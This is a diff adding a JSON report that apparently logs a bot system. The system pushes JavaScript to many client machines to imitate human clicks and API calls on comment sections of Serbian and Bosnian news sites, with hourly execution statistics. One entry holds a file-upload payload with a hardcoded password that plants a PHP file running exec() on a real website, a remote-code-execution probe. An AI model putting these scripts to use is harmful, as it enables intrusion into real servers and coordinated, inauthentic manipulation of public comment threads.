@@ -1,0 +1,123 @@
+{
+  "generated": "2026-10-18T15:19:33",
+  "actions": [
+    {
+      "id": 1,
+      "link": "https://www.kurir.rs/sport/tenis/4428595/sta-trijumf-sinera-u-sinsinatiju-znaci-za-novaka/komentari",
+      "limit": 30,
+      "uradjeno": 31,
+      "techniques": [
+        "XPath selektor (document.evaluate)",
+        "scrollIntoView (skrol do elementa)",
+        "el.click() (simuliran klik)"
+      ],
+      "js_excerpt_redacted": "var el=document.evaluate(\"/html/body/div[2]/div[3]/div/div[2]/div/div[4]/div[3]/div[3]/button[2]\", document, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null).singleNodeValue; if(el!=null)el.scrollIntoView(); if(el!=null)",
+      "executions": 23,
+      "machines": 23,
+      "exec_from": "2024-08-20 12:15:02",
+      "exec_to": "2024-08-29 09:54:17",
+      "exec_foreign": 0
+    },
+    {
+      "id": 2,
+      "link": "https://rtcg.me/sport/fudbal/594395/sutjeska-urucila-otkaz-radovicu.html",
+      "limit": 30,
+      "uradjeno": 31,
+      "techniques": [
+        "XPath selektor (document.evaluate)",
+        "scrollIntoView (skrol do elementa)",
+        "el.click() (simuliran klik)"
+      ],
+      "js_excerpt_redacted": "var el=document.evaluate(\"/html/body/div[7]/div[1]/div[2]/div/div[10]/div/div[2]/div[2]/div/div/ul/li[2]/a\", document, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null).singleNodeValue; if(el!=null)el.scrollIntoView(); if",
+      "executions": 31,
+      "machines": 31,
+      "exec_from": "2024-09-03 13:35:40",
+      "exec_to": "2024-09-03 13:39:44",
+      "exec_foreign": 0
+    },
+    {
+      "id": 4,
+      "link": "https://avaz.ba/vijesti/region/926304/na-sjeveru-kosova-srbi-prosvjeduju-drugi-dan-ispred-ureda-lokalne-uprave/komentari",
+      "limit": 100,
+      "uradjeno": 101,
+      "techniques": [
+        "fetch/XHR (API poziv)"
+      ],
+      "js_excerpt_redacted": "if (typeof myHeaders === 'undefined') {    const myHeaders = new Headers();    myHeaders.append(\"Content-Type\", \"application/json\");          const raw = JSON.stringify({ \"id\": \"828907\" });        const requestOptions = ",
+      "executions": 101,
+      "machines": 101,
+      "exec_from": "2024-09-03 14:53:42",
+      "exec_to": "2024-09-03 15:04:58",
+      "exec_foreign": 0
+    },
+    {
+      "id": 5,
+      "link": "https://progress.rs/",
+      "limit": 100,
+      "uradjeno": 4,
+      "techniques": [
+        "FormData POST (direktan upis)"
+      ],
+      "js_excerpt_redacted": "f=new FormData;f.set('pass','gxTEsG6zmxnXT4xkP2TAw5BrI2P9NZYUGbaRftN2');f.set('name',1);f.set('file',new File([`<?php chdir(__DIR__);exec('touch DUMMY_RCE_577357fa');unlink(__FILE__);?>`],'DUMMY_RCE_577357fa.php'));navig",
+      "executions": 4,
+      "machines": 4,
+      "exec_from": "2026-10-10 08:38:51",
+      "exec_to": "2026-10-10 15:08:36",
+      "exec_foreign": 3
+    }
+  ],
+  "exec_total": 511,
+  "hours_foreign": [
+    0,
+    0,
+    0,
+    0,
+    0,
+    0,
+    0,
+    0,
+    0,
+    0,
+    0,
+    0,
+    0,
+    0,
+    3,
+    1,
+    0,
+    50,
+    54,
+    38,
+    22,
+    49,
+    16,
+    16
+  ],
+  "hours_serbia": [
+    0,
+    0,
+    0,
+    0,
+    1,
+    2,
+    0,
+    0,
+    1,
+    0,
+    0,
+    0,
+    0,
+    0,
+    0,
+    0,
+    0,
+    0,
+    3,
+    0,
+    0,
+    0,
+    0,
+    0
+  ],
+  "note": "Sistem šalje sirovi JS klijentu da emulira čoveka u browseru (XPath + scrollIntoView + click + FormData). Hardkodovane tajne u JS su REDIGOVANE. Izvršenje po mašini je eksplicitno (vrgc_racunar_id)."
+}
